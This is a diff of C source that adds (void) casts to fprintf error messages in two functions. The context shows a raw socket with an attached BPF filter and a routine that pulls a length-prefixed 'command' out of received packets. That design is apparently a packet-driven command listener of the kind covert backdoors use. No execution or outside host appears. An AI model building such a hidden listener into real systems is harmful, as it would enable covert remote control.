@@ -18,7 +18,7 @@ int CreateRawFilterSocket(struct sock_fprog* bpf)
 
     if (NULL == bpf)
     {
-        fprintf(stderr, "bpf can not be NULL\n");
+        (void)fprintf(stderr, "bpf can not be NULL\n");
         goto end;
     }
 
@@ -26,14 +26,14 @@ int CreateRawFilterSocket(struct sock_fprog* bpf)
 
     if (-1 == sock)
     {
-        fprintf(stderr, "Could not create raw sock\n");
+        (void)fprintf(stderr, "Could not create raw sock\n");
         goto end;
     }
 
     if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, bpf, sizeof(*bpf)))
     {
         perror("setsockopt failed");
-        fprintf(stderr, "Could not set socket options\n");
+        (void)fprintf(stderr, "Could not set socket options\n");
         goto clean;
     }
 
@@ -57,20 +57,20 @@ int AcceptPacket(int raw_sock, unsigned char** packet_data)
 
     if (NULL == packet_data || NULL != *packet_data)
     {
-        fprintf(stderr, "packet_data must be a NULL double pointer\n");
+        (void)fprintf(stderr, "packet_data must be a NULL double pointer\n");
         goto end;
     }
 
     if (raw_sock < 0)
     {
-        fprintf(stderr, "raw_sock must be a valid fd\n");
+        (void)fprintf(stderr, "raw_sock must be a valid fd\n");
         goto end;
     }
 
     raw = calloc(recv_size, sizeof(*raw));
     if (NULL == raw)
     {
-        fprintf(stderr, "Failed to calloc raw\n");
+        (void)fprintf(stderr, "Failed to calloc raw\n");
         goto clean;
     }
 
@@ -78,7 +78,7 @@ int AcceptPacket(int raw_sock, unsigned char** packet_data)
     bytes_recv = recv(raw_sock, raw, recv_size, 0);
     if (bytes_recv < 0)
     {
-        fprintf(stderr, "Failed to receive data on raw_sock\n");
+        (void)fprintf(stderr, "Failed to receive data on raw_sock\n");
         goto clean;
     }
 
@@ -89,14 +89,14 @@ int AcceptPacket(int raw_sock, unsigned char** packet_data)
 
     if (cmd_len > bytes_recv)
     {
-        fprintf(stderr, "Command length is larger than received data\n");
+        (void)fprintf(stderr, "Command length is larger than received data\n");
         goto clean;
     }
 
     cmd = calloc(cmd_len + 1, sizeof(*cmd));
     if (NULL == cmd)
     {
-        fprintf(stderr, "Failed to calloc cmd\n");
+        (void)fprintf(stderr, "Failed to calloc cmd\n");
         goto clean;
     }
 
